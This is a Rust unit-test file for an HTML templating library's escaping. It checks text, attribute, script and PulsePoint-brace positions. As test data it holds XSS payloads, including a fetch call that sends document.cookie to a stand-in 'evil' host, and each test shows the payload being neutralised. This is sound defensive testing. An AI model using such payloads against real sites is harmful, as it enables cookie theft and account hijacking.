//! The value type, and the escaping that makes it safe to build one.

use super::*;
use axum::response::IntoResponse;

/// What `@{value}` writes in element position.
fn text(value: &impl Render) -> String {
    let mut out = String::new();
    value.render_into(&mut out);
    out
}

/// What `@{value}` writes inside a quoted attribute.
fn attr(value: &impl Render) -> String {
    let mut out = String::new();
    value.render_attr_into(&mut out);
    out
}

// ------------------------------------------------------------------ escaping

#[test]
fn text_escapes_what_would_open_a_tag() {
    assert_eq!(text(&"<script>"), "&lt;script&gt;");
    assert_eq!(text(&"a & b"), "a &amp; b");
}

/// Unlike compile-time markup, a value the author did not write is escaped
/// unconditionally — an entity in it came from data, not from the page.
#[test]
fn a_value_has_no_entities_to_preserve() {
    assert_eq!(text(&"&amp;"), "&amp;amp;");
}

#[test]
fn an_attribute_also_escapes_the_quotes() {
    assert_eq!(attr(&"a\"b"), "a&quot;b");
    assert_eq!(attr(&"a'b"), "a&#39;b");
    assert_eq!(attr(&"<&>"), "&lt;&amp;&gt;");
}

/// A quote in element content cannot break out of anything, so it stays as
/// it is — and a page full of prose keeps its punctuation.
#[test]
fn text_leaves_quotes_alone() {
    assert_eq!(text(&"it's \"fine\""), "it's \"fine\"");
}

#[test]
fn escaping_leaves_everything_else_untouched() {
    assert_eq!(text(&"héllo — 世界 🌍"), "héllo — 世界 🌍");
    assert_eq!(text(&""), "");
}

/// The classic injection, in both positions.
#[test]
fn an_injected_payload_cannot_escape() {
    let payload = "\"><script>alert(1)</script>";
    assert!(!attr(&payload).contains('<'));
    assert!(!attr(&payload).contains('"'));
    assert!(!text(&payload).contains('<'));
}

// -------------------------------------------------------------- the value

/// The one door raw markup comes in through.
#[test]
fn from_raw_trusts_its_caller() {
    let html = Html::from_raw("<b>bold</b>".to_string());
    assert_eq!(html.as_str(), "<b>bold</b>");
}

#[test]
fn escape_wraps_a_string_safely() {
    assert_eq!(Html::escape("<b>").as_str(), "&lt;b&gt;");
}

#[test]
fn a_value_can_be_taken_apart() {
    let html = Html::from_raw("<p>x</p>".to_string());
    assert!(!html.is_empty());
    assert!(Html::default().is_empty());
    assert_eq!(html.into_string(), "<p>x</p>");
}

/// A `children` argument is mandatory, so a caller with nothing to put
/// inside needs a value that renders to nothing.
#[test]
fn empty_is_the_children_a_caller_has_none_of() {
    let children = Html::empty();
    assert!(children.is_empty());
    assert_eq!(text(&children), "");
}

// ----------------------------------------------------------- script source
// `@{…}` inside a `<script>` writes JS source, so its tests check that source
// rather than escaped HTML. See `RenderJs` and `Json` in `html.rs`.

fn js(value: &impl RenderJs) -> String {
    let mut out = String::new();
    value.render_js_into(&mut out);
    out
}

/// A number lands as its literal, the way the author would have written it.
#[test]
fn a_number_interpolates_as_a_js_number() {
    assert_eq!(js(&42u32), "42");
    assert_eq!(js(&-7i64), "-7");
    assert_eq!(js(&1.5f64), "1.5");
    assert_eq!(js(&usize::MAX), usize::MAX.to_string());
}

/// A flag is its JS literal — the same as the HTML one, by coincidence of the
/// two languages sharing the spelling.
#[test]
fn a_bool_interpolates_as_true_or_false() {
    assert_eq!(js(&true), "true");
    assert_eq!(js(&false), "false");
}

/// A string lands as a quoted JS literal — the spelling `pp.state(…)`, and
/// JS itself, expect — not as bare text the way HTML does.
#[test]
fn a_string_interpolates_as_a_quoted_js_literal() {
    assert_eq!(js(&"Ada"), "\"Ada\"");
    assert_eq!(js(&String::from("Ada")), "\"Ada\"");
}

/// A smart apostrophe and a quote are JSON-string-escaped — both so the
/// literal stays valid JS, and so a string a user typed cannot break out of
/// the script body's quoting.
#[test]
fn a_string_is_quoted_and_escaped() {
    assert_eq!(js(&"it's \"fine\""), "\"it's \\\"fine\\\"\"");
}

/// `None` is JS `null`; `Some(v)` is the value — the literal an optional
/// becomes in source, rather than the nothing `Render` writes for one.
#[test]
fn an_option_interpolates_as_null_or_its_value() {
    assert_eq!(js(&Some(42u32)), "42");
    assert_eq!(js(&None::<u32>), "null");
}

/// A reference is its target, so `@{&value}` is the borrowed-prop form.
#[test]
fn a_reference_renders_js_as_its_target() {
    let owned = String::from("Ada");
    assert_eq!(js(&&owned), "\"Ada\"");
}

/// A struct goes through `serde_json` and lands as a JSON object — the
/// spelling `pp.state(…)` is meant to be seeded with, not a hand-built one.
#[test]
fn a_struct_interpolates_as_json() {
    #[derive(serde::Serialize)]
    struct User {
        name: &'static str,
        admin: bool,
    }
    let user = User {
        name: "Ada",
        admin: true,
    };
    assert_eq!(js(&Json(&user)), "{\"name\":\"Ada\",\"admin\":true}");
}

/// `</script>` carries its payload through the body, rewritten so the HTML
/// parser does not see the closing tag the string is named after.
#[test]
fn a_string_with_a_script_close_is_neutralised() {
    let payload = "</script><script>alert(1)</script>";
    assert!(!js(&payload).contains("</script>"));
    assert!(!js(&payload).contains("<script"));
    // The JS parser decodes the escape back to `<`; the HTML parser does not
    // see a tag start. `>` is harmless inside a script body — the HTML parser
    // only ends `<script>` on the `</` sequence — so it stays as a literal.
    assert_eq!(
        js(&payload),
        "\"\\u003c/script>\\u003cscript>alert(1)\\u003c/script>\""
    );
}

/// A nested struct that carries the payload inside a string field is also
/// neutralised — `serde_json` puts it inside a quoted value and the rewrite
/// removes the `<` before the HTML parser sees it.
#[test]
fn a_json_string_field_is_neutralised_too() {
    #[derive(serde::Serialize)]
    struct Carrier {
        note: String,
    }
    let carrier = Carrier {
        note: "</script>".into(),
    };
    let rendered = js(&Json(&carrier));
    assert!(!rendered.contains("</script>"));
}

/// The fast path: a value whose JSON has no `<` ships the bytes as-is, so a
/// number or an unencrypted struct does not pay for the rewrite.
#[test]
fn a_script_value_without_a_lt_passes_through() {
    assert_eq!(js(&Json(&42u32)), "42");
}

/// A list is several blocks, because each `html!` renders one parent
/// element. This is how they become the one value a `children` takes.
#[test]
fn concat_joins_fragments_in_order() {
    let parts = vec![
        Html::from_raw("<li>a</li>".to_string()),
        Html::from_raw("<li>b</li>".to_string()),
    ];
    assert_eq!(Html::concat(parts).as_str(), "<li>a</li><li>b</li>");
}

#[test]
fn concat_of_nothing_is_empty() {
    assert!(Html::concat(Vec::new()).is_empty());
}

/// Joining does not re-escape: the pieces came out of `html!` already, and
/// running them through the text rules again would show their own tags.
#[test]
fn concat_leaves_its_pieces_alone() {
    let parts = vec![
        Html::escape("a & b"),
        Html::from_raw("<b>c</b>".to_string()),
    ];
    assert_eq!(Html::concat(parts).as_str(), "a &amp; b<b>c</b>");
}

/// This is what makes `<slot />` and nested components compose: an `Html`
/// has been escaped already, so escaping it again would show its own tags.
#[test]
fn html_passes_through_unescaped() {
    let inner = Html::from_raw("<b>bold</b>".to_string());
    assert_eq!(text(&inner), "<b>bold</b>");
}

// -------------------------------------------------------------- the values

#[test]
fn strings_render_either_way_round() {
    assert_eq!(text(&String::from("<b>")), "&lt;b&gt;");
    assert_eq!(text(&"<b>"), "&lt;b&gt;");
    assert_eq!(attr(&String::from("\"")), "&quot;");
}

/// `@{&value}` is what interpolating a borrowed prop looks like.
#[test]
fn a_reference_renders_as_its_target() {
    let owned = String::from("<b>");
    assert_eq!(text(&&owned), "&lt;b&gt;");
    assert_eq!(attr(&&owned), "&lt;b&gt;");
}

/// The usual way to make an attribute or a block conditional.
#[test]
fn an_option_renders_nothing_when_empty() {
    assert_eq!(text(&Some("x")), "x");
    assert_eq!(text(&None::<&str>), "");
    assert_eq!(attr(&Some("\"")), "&quot;");
    assert_eq!(attr(&None::<&str>), "");
}

#[test]
fn numbers_and_flags_need_no_escaping() {
    assert_eq!(text(&42u32), "42");
    assert_eq!(text(&-7i64), "-7");
    assert_eq!(text(&1.5f64), "1.5");
    assert_eq!(text(&true), "true");
    assert_eq!(text(&'x'), "x");
    assert_eq!(text(&usize::MAX), usize::MAX.to_string());
}

// ------------------------------------------------------------- responding

#[test]
fn a_page_is_served_as_html() {
    let res = Html::from_raw("<p>x</p>".to_string()).into_response();
    assert_eq!(
        res.headers().get(axum::http::header::CONTENT_TYPE).unwrap(),
        "text/html; charset=utf-8"
    );
}

/// Layout layers sit above every route in their subtree. Without this marker
/// a `route.rs` returning JSON would come back wrapped in a page shell.
#[test]
fn a_page_is_marked_for_the_layout_layers() {
    let res = Html::from_raw("<p>x</p>".to_string()).into_response();
    assert!(res.extensions().get::<PageBody>().is_some());
}

// ------------------------------------------------------- PulsePoint braces

/// PulsePoint compiles the rendered page, and braces are not HTML-special: a
/// value's `{…}` would arrive as an expression the browser evaluates. Each
/// brace is written as a character reference instead, in text and in
/// attributes.
#[test]
fn a_value_cannot_open_a_pulsepoint_expression() {
    let stored = "{fetch('//evil/' + document.cookie)}";
    assert_eq!(
        text(&stored),
        "&#123;fetch('//evil/' + document.cookie)&#125;"
    );
    assert_eq!(
        attr(&stored),
        "&#123;fetch(&#39;//evil/&#39; + document.cookie)&#125;"
    );
    assert_eq!(Html::escape("{x}").as_str(), "&#123;x&#125;");
}

/// `Html::from_raw` is the trust boundary: markup built through it keeps its
/// braces live, the way an authored `{…}` binding does.
#[test]
fn trusted_markup_keeps_its_bindings() {
    assert_eq!(
        text(&Html::from_raw("<b>{count}</b>".into())),
        "<b>{count}</b>"
    );
}

fn deferred(markup: &str) -> String {
    let mut out = String::new();
    render_deferred_children(&Html::from_raw(markup.into()), &mut out);
    out
}

/// Inside the root layout's deferred template a single-layer reference is
/// raised one layer, so the browser's parse leaves `&#123;` for the runtime
/// to render as a brace.
#[test]
fn deferred_children_raise_every_single_layer_brace_reference() {
    assert_eq!(
        deferred("<p>&#123;x&#125;</p>"),
        "<p>&amp;#123;x&amp;#125;</p>"
    );
    assert_eq!(
        deferred("<i title=\"&#X7B;&lbrace;&RBRACE;&#x7d;\"></i>"),
        "<i title=\"&amp;#X7B;&amp;lbrace;&amp;RBRACE;&amp;#x7d;\"></i>"
    );
}

/// What `html!` already doubled, other references, and live bindings pass
/// through unchanged.
#[test]
fn deferred_children_leave_everything_else_alone() {
    let markup = "<p>&amp;#123;a&amp;#125; &amp; &lt;b&gt; &#160; {count} &#1234;</p>";
    assert_eq!(deferred(markup), markup);
}

/// Script and style bodies are raw text the browser never decodes, so a
/// reference there is source and stays as written.
#[test]
fn deferred_children_skip_raw_text_elements() {
    let markup = "<script>const s = \"&#123;\";</script><STYLE>a::after{content:\"&#125;\"}</STYLE><p>&#123;</p>";
    assert_eq!(
        deferred(markup),
        "<script>const s = \"&#123;\";</script><STYLE>a::after{content:\"&#125;\"}</STYLE><p>&amp;#123;</p>"
    );
    assert_eq!(
        deferred("<scripted>&#123;</scripted>"),
        "<scripted>&amp;#123;</scripted>"
    );
    assert_eq!(deferred("<script>&#123;"), "<script>&#123;");
}
